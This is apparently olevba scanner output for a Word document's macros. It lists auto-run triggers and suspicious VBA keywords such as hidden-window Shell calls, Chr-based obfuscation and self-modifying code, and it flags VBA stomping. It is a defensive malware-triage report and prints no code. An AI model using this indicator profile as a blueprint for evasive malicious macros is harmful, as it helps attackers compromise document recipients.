|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

